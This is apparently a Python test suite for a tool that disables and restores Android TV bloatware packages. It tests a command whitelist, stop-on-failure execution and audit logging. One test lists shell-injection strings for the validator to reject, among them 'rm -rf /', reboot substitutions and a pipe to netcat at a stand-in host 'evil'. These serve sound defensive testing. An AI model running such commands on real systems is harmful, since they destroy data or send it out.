"""Tests para engine/executor.py (FASE 5).

Cubren:
- validate_write_command: whitelist estricta (solo pm disable-user/enable
  --user 0 <pkg>), rechazo de inyecciones
- execute_plan: ejecución en orden, fail-safe al primer fallo,
  log de cada acción, rechazo de plan no dry-run
- restore_packages: re-habilitación, fail-safe, log de restoration
"""
import os
import tempfile
import unittest

from engine.audit_log import read_log
from engine.executor import (
    ExecutionError,
    RunResult,
    execute_plan,
    restore_packages,
    validate_write_command,
)
from engine.planner import ExecutionPlan, PlanAction


class FakeRunner:
    """Runner falso: responde según un mapa cmd -> (exit_code, stdout, stderr)."""

    def __init__(self, responses=None, default=None):
        self.responses = responses or {}
        self.default = default or (0, "ok", "")
        self.calls = []

    def run(self, device, cmd):
        self.calls.append((device, cmd))
        code, out, err = self.responses.get(cmd, self.default)
        return RunResult(code, out, err)


def make_plan(actions, dry_run=True):
    return ExecutionPlan(
        profile_id="test-profile",
        model="TEST",
        os_family="android-tv",
        dry_run=dry_run,
        actions=tuple(actions),
        skipped=(),
    )


def make_action(pkg, state="enabled"):
    return PlanAction(
        package=pkg,
        command=f"pm disable-user --user 0 {pkg}",
        reversible_command=f"pm enable --user 0 {pkg}",
        state_before=state,
    )


class TestValidateWriteCommand(unittest.TestCase):
    def test_disable_user_ok(self):
        self.assertEqual(
            validate_write_command("pm disable-user --user 0 com.example.bloat"),
            "pm disable-user --user 0 com.example.bloat",
        )

    def test_enable_user_ok(self):
        self.assertEqual(
            validate_write_command("pm enable --user 0 com.example.app"),
            "pm enable --user 0 com.example.app",
        )

    def test_uninstall_rejected(self):
        with self.assertRaises(ExecutionError):
            validate_write_command("pm uninstall com.example.bloat")

    def test_root_rejected(self):
        with self.assertRaises(ExecutionError):
            validate_write_command("su -c pm disable-user --user 0 com.x")

    def test_shell_injection_rejected(self):
        for bad in [
            "pm disable-user --user 0 com.x; rm -rf /",
            "pm disable-user --user 0 com.x && reboot",
            "pm disable-user --user 0 com.x$(reboot)",
            "pm disable-user --user 0 com.x`reboot`",
            "pm disable-user --user 0 com.x | nc evil 1234",
            "pm disable-user --user 1 com.x",  # otro usuario
            "pm disable-user com.x",  # falta --user 0
        ]:
            with self.assertRaises(ExecutionError, msg=bad):
                validate_write_command(bad)

    def test_non_string_rejected(self):
        with self.assertRaises(ExecutionError):
            validate_write_command(None)  # type: ignore[arg-type]

    def test_oversized_package_rejected(self):
        with self.assertRaises(ExecutionError):
            validate_write_command(f"pm enable --user 0 {'a.' * 200}x")

    def test_whitespace_tolerated(self):
        self.assertEqual(
            validate_write_command("  pm enable --user 0 com.x  "),
            "pm enable --user 0 com.x",
        )


class TestExecutePlan(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.mkdtemp()
        self.log = os.path.join(self.tmp, "ops.jsonl")

    def test_all_success(self):
        plan = make_plan([make_action("com.a"), make_action("com.b")])
        runner = FakeRunner()
        summary = execute_plan(plan, runner, "dev:5555", self.log)
        self.assertEqual(summary["executed"], ["com.a", "com.b"])
        self.assertIsNone(summary["failed"])
        self.assertEqual(summary["remaining"], [])
        self.assertEqual(len(runner.calls), 2)
        self.assertEqual(runner.calls[0][0], "dev:5555")

    def test_stops_at_first_failure(self):
        plan = make_plan([make_action("com.a"), make_action("com.b"), make_action("com.c")])
        runner = FakeRunner(responses={"pm disable-user --user 0 com.b": (1, "", "fallo")})
        summary = execute_plan(plan, runner, "dev:5555", self.log)
        self.assertEqual(summary["executed"], ["com.a"])
        self.assertEqual(summary["failed"], "com.b")
        self.assertEqual(summary["remaining"], ["com.c"])
        # No se ejecuta com.c
        self.assertEqual(len(runner.calls), 2)

    def test_logs_every_action(self):
        plan = make_plan([make_action("com.a"), make_action("com.b")])
        runner = FakeRunner(responses={"pm disable-user --user 0 com.b": (1, "", "x")})
        execute_plan(plan, runner, "dev", self.log)
        entries = read_log(self.log)
        ops = [e["op"] for e in entries]
        self.assertEqual(ops.count("action_executed"), 2)
        # La acción fallida queda registrada con su exit_code
        failed = [e for e in entries if e["payload"]["package"] == "com.b"][0]
        self.assertEqual(failed["payload"]["exit_code"], 1)

    def test_rejects_non_dry_run_plan(self):
        plan = make_plan([make_action("com.a")], dry_run=False)
        runner = FakeRunner()
        with self.assertRaises(ExecutionError):
            execute_plan(plan, runner, "dev", self.log)
        self.assertEqual(runner.calls, [])  # nada se ejecutó

    def test_empty_plan(self):
        plan = make_plan([])
        runner = FakeRunner()
        summary = execute_plan(plan, runner, "dev", self.log)
        self.assertEqual(summary, {"executed": [], "failed": None, "remaining": []})


class TestRestorePackages(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.mkdtemp()
        self.log = os.path.join(self.tmp, "ops.jsonl")

    def test_restores_all(self):
        runner = FakeRunner()
        summary = restore_packages(["com.a", "com.b"], runner, "dev", self.log)
        self.assertEqual(summary["executed"], ["com.a", "com.b"])
        self.assertIsNone(summary["failed"])
        # Los comandos son pm enable
        for _, cmd in runner.calls:
            self.assertTrue(cmd.startswith("pm enable --user 0 "))

    def test_fail_safe_on_failure(self):
        runner = FakeRunner(
            responses={"pm enable --user 0 com.a": (1, "", "denegado")}
        )
        summary = restore_packages(["com.a", "com.b"], runner, "dev", self.log)
        self.assertEqual(summary["executed"], [])
        self.assertEqual(summary["failed"], "com.a")
        self.assertEqual(summary["remaining"], ["com.b"])
        self.assertEqual(len(runner.calls), 1)

    def test_logs_restoration(self):
        runner = FakeRunner()
        restore_packages(["com.a"], runner, "dev", self.log)
        entries = read_log(self.log)
        rest = [e for e in entries if e["op"] == "restoration"]
        self.assertEqual(len(rest), 1)
        self.assertTrue(rest[0]["payload"]["success"])
        self.assertEqual(rest[0]["payload"]["packages"], ["com.a"])

    def test_logs_failed_restoration(self):
        runner = FakeRunner(responses={"pm enable --user 0 com.x": (1, "", "x")})
        restore_packages(["com.x"], runner, "dev", self.log)
        entries = read_log(self.log)
        rest = [e for e in entries if e["op"] == "restoration"]
        self.assertFalse(rest[0]["payload"]["success"])


if __name__ == "__main__":
    unittest.main()
